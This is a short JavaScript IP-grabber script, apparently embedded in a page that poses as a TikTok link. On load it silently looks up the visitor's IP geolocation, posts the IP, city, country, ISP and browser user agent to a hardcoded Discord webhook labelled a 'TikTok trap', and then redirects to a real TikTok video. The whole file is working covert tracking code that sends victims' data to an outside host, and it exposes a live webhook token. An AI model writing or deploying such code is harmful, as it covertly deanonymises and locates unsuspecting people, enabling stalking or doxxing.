const WEBHOOK_URL = "https://discord.com/api/webhooks/1498878074752860183/uuO3iSI5ye5pexJVKUcDa67tGl4f9vW6UAAiDNzcONg-PMTwr81wTjXXypI5ESPqkMlJ";
const TIKTOK_REAL = "https://www.tiktok.com/@the_magito/video/7620363247924825351";

async function unidad4L() {
    try {
        // Captura de datos rápida
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                embeds: [{
                    title: "🕵️ Hit de IP - Trampa TikTok",
                    color: 16711680,
                    fields: [
                        {name: "🌐 IP", value: `\`${data.ip}\``, inline: true},
                        {name: "📍 Ubicación", value: `${data.city}, ${data.country_name}`, inline: true},
                        {name: "📡 Operador", value: data.org, inline: false},
                        {name: "📱 Device", value: navigator.userAgent, inline: false}
                    ],
                    footer: { text: "Unidad 4L Invisible" }
                }]
            })
        });
    } catch (e) {}

    // Redirección inmediata
    window.location.href = TIKTOK_REAL;
}

unidad4L();
